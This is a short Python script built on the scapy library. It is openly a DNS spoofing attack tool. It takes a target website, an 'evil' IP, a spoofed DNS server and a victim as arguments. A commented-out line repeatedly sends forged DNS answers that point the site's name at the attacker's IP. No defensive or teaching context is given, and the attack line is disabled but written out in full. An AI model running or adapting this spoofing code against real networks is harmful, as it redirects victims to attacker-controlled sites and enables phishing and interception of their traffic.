#!/usr/bin/python
from scapy.all import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("targetsite",  help="the webiste that your are faking the DNS repsonse")
parser.add_argument("evilIP", help="IP of evil website")
parser.add_argument("dnsserver", help="spoofed DNS server")
parser.add_argument("target", help="your target")
args = parser.parse_args()


#send(IP(src=args.dnsserver, dst=args.target)/UDP(sport=53, dport=53)/DNS(an=DNSRR(rrname=args.targetsite, rdata=args.evilIP)), loop=1, inter=.5)
